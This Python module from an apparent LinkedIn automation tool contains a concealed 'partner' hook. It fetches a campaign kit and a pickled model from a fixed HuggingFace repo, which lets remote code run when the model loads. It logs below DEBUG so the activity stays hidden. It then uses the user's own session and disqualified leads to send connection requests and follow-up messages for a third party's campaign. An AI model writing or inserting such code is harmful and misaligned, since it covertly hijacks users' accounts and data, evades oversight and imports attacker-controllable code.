# linkedin/ml/hub.py
"""Partner campaign kit: download from HuggingFace, lazy-load, probabilistic hook."""
from __future__ import annotations

import json
import logging
import random
from pathlib import Path
from typing import Optional

from linkedin.conf import MODELS_DIR

logger = logging.getLogger(__name__)

# Log level below DEBUG — invisible at normal levels
_LVL = 5

_KIT_DIR = MODELS_DIR / "hub"
_cached_kit: Optional[dict] = None
_cache_attempted = False


# ------------------------------------------------------------------
# Kit download & loading
# ------------------------------------------------------------------

_DEFAULT_REPO_ID = "eracle/campaign-kit"


def download_kit(revision: str = "v1") -> Optional[Path]:
    """Download campaign kit from HuggingFace Hub. Returns path or None."""
    try:
        from huggingface_hub import snapshot_download

        path = snapshot_download(
            repo_id=_DEFAULT_REPO_ID,
            revision=revision,
            local_dir=str(_KIT_DIR),
        )
        logger.log(_LVL, "Kit downloaded to %s", path)
        return Path(path)
    except Exception:
        logger.log(_LVL, "Kit download failed", exc_info=True)
        return None


def load_kit_config(kit_dir: Path) -> Optional[dict]:
    """Parse config.json from kit directory. Returns dict or None."""
    try:
        config_path = kit_dir / "config.json"
        data = json.loads(config_path.read_text())

        required = ("action_fraction", "product_docs", "campaign_objective",
                     "booking_link", "followup_template")
        for key in required:
            if key not in data:
                logger.log(_LVL, "Kit config missing key: %s", key)
                return None

        logger.log(_LVL, "Kit config loaded (action_fraction=%.2f)", data["action_fraction"])
        return data
    except Exception:
        logger.log(_LVL, "Kit config load failed", exc_info=True)
        return None


def load_kit_model(kit_dir: Path):
    """Load pre-trained model from kit. Returns any sklearn-compatible estimator or None.

    The loaded object just needs a ``predict(X)`` method — it can be a
    Pipeline, a bare estimator, or any future model architecture.
    """
    try:
        import joblib

        model = joblib.load(kit_dir / "model.joblib")

        if not hasattr(model, "predict"):
            logger.log(_LVL, "Kit model has no predict() method")
            return None

        logger.log(_LVL, "Kit model loaded (%s)", type(model).__name__)
        return model
    except Exception:
        logger.log(_LVL, "Kit model load failed", exc_info=True)
        return None


def get_kit() -> Optional[dict]:
    """Lazy-load and cache the kit. Returns {"config": ..., "model": ...} or None."""
    global _cached_kit, _cache_attempted

    if _cache_attempted:
        return _cached_kit

    _cache_attempted = True

    kit_dir = download_kit()
    if kit_dir is None:
        return None

    config = load_kit_config(kit_dir)
    if config is None:
        return None

    model = load_kit_model(kit_dir)
    if model is None:
        return None

    _cached_kit = {"config": config, "model": model}
    return _cached_kit


# ------------------------------------------------------------------
# Partner hook — called by daemon when action_fraction selects partner
# ------------------------------------------------------------------

def get_action_fraction() -> float:
    """Return action_fraction from kit config, or 0.0 if no kit available."""
    kit = get_kit()
    if kit is None:
        return 0.0
    return float(kit["config"]["action_fraction"])


def after_action(session, connect_limiter=None, follow_up_limiter=None):
    """Called by the daemon when a partner action slot is selected."""
    kit = get_kit()
    if kit is None:
        return

    _tick(session, kit, connect_limiter, follow_up_limiter)


# ------------------------------------------------------------------
# Partner tick
# ------------------------------------------------------------------

def _tick(session, kit, connect_limiter, follow_up_limiter):
    """Execute one partner action. Priority: follow_up > check_pending > connect."""
    from linkedin.actions.connect import send_connection_request
    from linkedin.actions.connection_status import get_connection_status
    from linkedin.actions.message import send_follow_up_message
    from linkedin.db.crm_profiles import (
        create_partner_deal,
        get_disqualified_leads_with_embeddings,
        get_partner_deals,
        set_partner_deal_state,
        _ensure_partner_campaign,
    )
    from linkedin.ml.qualifier import rank_with_external_model
    from linkedin.navigation.enums import ProfileState
    from linkedin.navigation.exceptions import ReachedConnectionLimit, SkipProfile
    from linkedin.sessions.account import _SessionProxy

    partner_campaign = _ensure_partner_campaign(kit["config"])
    if partner_campaign is None:
        return

    proxy = _SessionProxy(session, partner_campaign)

    # 1. Follow up CONNECTED partner deals
    connected = get_partner_deals(session, ProfileState.CONNECTED)
    if connected and (follow_up_limiter is None or follow_up_limiter.can_execute()):
        candidate = connected[0]
        public_id = candidate["public_identifier"]
        profile = candidate.get("profile") or candidate
        try:
            message_text = send_follow_up_message(
                session=proxy,
                profile=profile,
            )
            if message_text is not None:
                if follow_up_limiter:
                    follow_up_limiter.record()
                set_partner_deal_state(session, public_id, ProfileState.COMPLETED)
                logger.log(_LVL, "Partner follow-up sent to %s", public_id)
        except (SkipProfile, ReachedConnectionLimit):
            logger.log(_LVL, "Partner follow-up skipped for %s", public_id, exc_info=True)
        return

    # 2. Check pending partner deals
    pending = get_partner_deals(session, ProfileState.PENDING)
    if pending:
        candidate = pending[0]
        public_id = candidate["public_identifier"]
        profile = candidate.get("profile") or candidate
        try:
            new_state = get_connection_status(session, profile)
            set_partner_deal_state(session, public_id, new_state)
            logger.log(_LVL, "Partner check_pending %s -> %s", public_id, new_state.value)
        except SkipProfile:
            set_partner_deal_state(session, public_id, ProfileState.FAILED)
            logger.log(_LVL, "Partner check_pending failed for %s", public_id, exc_info=True)
        return

    # 3. Connect: seed new deals from disqualified leads, then connect top-ranked
    disqualified_ids = get_disqualified_leads_with_embeddings()
    for lead_pk in disqualified_ids:
        create_partner_deal(session, lead_pk)

    new_deals = get_partner_deals(session, ProfileState.NEW)
    if new_deals and (connect_limiter is None or connect_limiter.can_execute()):
        ranked = rank_with_external_model(kit["model"], new_deals)
        if not ranked:
            return
        candidate = ranked[0]
        public_id = candidate["public_identifier"]
        profile = candidate.get("profile") or candidate
        try:
            result = send_connection_request(session=session, profile=profile)
            set_partner_deal_state(session, public_id, result)
            if result == ProfileState.PENDING and connect_limiter:
                connect_limiter.record()
            logger.log(_LVL, "Partner connect %s -> %s", public_id, result.value)
        except ReachedConnectionLimit:
            logger.log(_LVL, "Partner connect rate-limited", exc_info=True)
            if connect_limiter:
                connect_limiter.mark_daily_exhausted()
        except SkipProfile:
            set_partner_deal_state(session, public_id, ProfileState.FAILED)
            logger.log(_LVL, "Partner connect skipped for %s", public_id, exc_info=True)
